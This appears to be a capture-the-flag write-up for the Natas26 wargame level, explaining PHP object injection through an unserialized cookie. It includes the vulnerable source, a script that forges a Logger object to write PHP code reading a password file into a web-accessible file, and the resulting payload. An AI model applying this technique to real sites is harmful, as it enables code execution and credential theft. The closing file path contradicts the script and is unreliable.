---
layout: post
title:  "Natas26: PHP Object Injection"
date:   2018-02-13 00:00:00 -0400
categories: master
---


The source code:

```
<?php
    // sry, this is ugly as hell.
    // cheers kaliman ;)
    // - morla
    
    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";
      
            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$initMsg);
            fclose($fd);
        }                       
      
        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }                       
      
        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }                       
    }
 
    function showImage($filename){
        if(file_exists($filename))
            echo "<img src=\"$filename\">";
    }

    function drawImage($filename){
        $img=imagecreatetruecolor(400,300);
        drawFromUserdata($img);
        imagepng($img,$filename);     
        imagedestroy($img);
    }
    
    function drawFromUserdata($img){
        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
        
            $color=imagecolorallocate($img,0xff,0x12,0x1c);
            imageline($img,$_GET["x1"], $_GET["y1"], 
                            $_GET["x2"], $_GET["y2"], $color);
        }
        
        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
            if($drawing)
                foreach($drawing as $object)
                    if( array_key_exists("x1", $object) && 
                        array_key_exists("y1", $object) &&
                        array_key_exists("x2", $object) && 
                        array_key_exists("y2", $object)){
                    
                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
                        imageline($img,$object["x1"],$object["y1"],
                                $object["x2"] ,$object["y2"] ,$color);
            
                    }
        }    
    }
    
    function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }
        
        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }
        
        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
?>

<h1>natas26</h1>
<div id="content">

Draw a line:<br>
<form name="input" method="get">
X1<input type="text" name="x1" size=2>
Y1<input type="text" name="y1" size=2>
X2<input type="text" name="x2" size=2>
Y2<input type="text" name="y2" size=2>
<input type="submit" value="DRAW!">
</form> 

<?php
    session_start();

    if (array_key_exists("drawing", $_COOKIE) ||
        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){  
        $imgfile="img/natas26_" . session_id() .".png"; 
        drawImage($imgfile); 
        showImage($imgfile);
        storeData();
    }
    
?>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

This level is a classic example of a [PHP Object 
Injection](https://www.owasp.org/index.php/PHP_Object_Injection 
"OWASP PHP Oject Injection") that uses unsanitized input to the 
`unserialize()` PHP function to create an object with user-supplied strings. This type of 
exploit requires a class that implements magic methods. For this level, we'll be exploiting 
the `__destruct()` in the `Logger` class.

On the surface, this level accepts four input variables from the user, and the uses those 4 
inputs to generate a graph. The code then stores that data in the `drawing` cookie.

```   
if (array_key_exists("drawing", $_COOKIE)){
	$drawing=unserialize(base64_decode($_COOKIE["drawing"]));
} 
```

Since cookies are editable, we can use this to create a `Logger` object with a custom 
`exitMsg` variable to execute PHP code to read the natas27 password file. We also edit the 
`logFile` variable to point to a location that we can access via the web browser.

The following code will create a clone of the Logger class with the modified variables, then 
serialize it, encode with base64, and finally urlencode to pass off to a cookie editor.

```
<?php

class Logger
{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
                $this->exitMsg= "<?php echo exec('cat /etc/natas_webpass/natas27')?>";
                $this->logFile = "img/" . $file . ".php";
        }
}
print urlencode(base64_encode(serialize(new Logger("2"))));
?>
```

Running this code will produce the following output:
```
root@kali:~# php temp.php
Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo5OiJ
pbWcvMi5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7TjtzOjE1OiIATG
9nZ2VyAGV4aXRNc2ciO3M6NTE6Ijw%2FcGhwIGVjaG8gZXhlYygnY2F0IC9
ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk%2FPiI7fQ%3D%3D
```

Editing our `drawing` cookie with the above base64 string will produce a file in `img/2.log` 
with the natas27 password, not shown here for spoilers.


